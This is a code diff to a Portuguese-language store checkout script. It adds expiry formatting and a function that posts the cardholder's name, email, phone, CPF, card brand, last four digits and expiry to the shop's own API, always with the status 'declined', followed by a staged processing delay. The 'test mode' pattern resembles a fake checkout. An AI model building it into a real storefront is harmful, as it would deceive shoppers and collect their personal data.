@@ -169,6 +169,12 @@
     return 'Cartao';
   }
 
+  function formatExpiry(value) {
+    const digits = onlyDigits(value).slice(0, 4);
+    if (digits.length <= 2) return digits;
+    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+  }
+
   function isFutureExpiry(value) {
     const match = String(value || '').match(/^(\d{2})\/?(\d{2})$/);
     if (!match) return false;
@@ -209,6 +215,38 @@
     cards.unshift(record);
     localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 100)));
     return record;
+  }
+
+  async function saveTestCardToDatabase(form, cart) {
+    const number = onlyDigits(form.cardNumber.value);
+    const response = await fetch('/api/card-attempts', {
+      method: 'POST',
+      credentials: 'same-origin',
+      headers: {
+        Accept: 'application/json',
+        'Content-Type': 'application/json',
+        'X-Requested-With': 'XMLHttpRequest'
+      },
+      body: JSON.stringify({
+        holder: form.cardHolder.value.trim(),
+        email: form.email.value.trim(),
+        phone: form.phone.value.trim(),
+        cpf: onlyDigits(form.cardCpf.value || form.document.value),
+        cardBrand: cardBrand(number),
+        cardLast4: number.slice(-4),
+        cardExpiry: form.cardExpiry.value.trim(),
+        amount: Number(cart.total_price || 0) / 100,
+        status: 'Recusado',
+        luhnValid: true
+      })
+    });
+    const payload = await response.json().catch(() => ({}));
+
+    if (!response.ok) {
+      throw new Error(payload.message || 'Nao foi possivel registrar a tentativa do cartao.');
+    }
+
+    return payload;
   }
 
   function openCardProcessingModal() {
@@ -365,7 +403,7 @@
             <label>Nome no cartao<input name="cardHolder" autocomplete="cc-name"></label>
             <label>CPF do titular<input name="cardCpf" inputmode="numeric"></label>
             <label>Numero do cartao<input name="cardNumber" inputmode="numeric" autocomplete="cc-number"><span class="divino-card-error" id="divino-card-number-error" hidden>Cartao Invalido</span></label>
-            <label>Validade<input name="cardExpiry" placeholder="MM/AA" autocomplete="cc-exp"></label>
+            <label>Validade<input name="cardExpiry" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="cc-exp"></label>
             <label>CVV<input name="cardCvv" inputmode="numeric" autocomplete="cc-csc"></label>
           </div>
           <p class="divino-checkout-note">Modo teste: validamos Luhn e salvamos somente dados mascarados no admin.</p>
@@ -381,6 +419,7 @@
 
     const cardSubmit = section.querySelector('[data-payment-panel="card"] button[type="submit"]');
     const cardNumberInput = section.querySelector('[name="cardNumber"]');
+    const cardExpiryInput = section.querySelector('[name="cardExpiry"]');
     const cardError = section.querySelector('#divino-card-number-error');
 
     function updateCardValidation() {
@@ -405,6 +444,9 @@
     section.querySelectorAll('[data-payment-panel="card"] input').forEach((input) => {
       input.addEventListener('input', updateCardValidation);
       input.addEventListener('blur', updateCardValidation);
+    });
+    cardExpiryInput.addEventListener('input', () => {
+      cardExpiryInput.value = formatExpiry(cardExpiryInput.value);
     });
 
     tabs.forEach((tab) => {
@@ -441,6 +483,7 @@
             throw new Error('CVV invalido.');
           }
           saveTestCard(form, cart);
+          await saveTestCardToDatabase(form, cart);
           openCardProcessingModal();
           const delay = 7000 + Math.floor(Math.random() * 8001);
           window.setTimeout(() => {
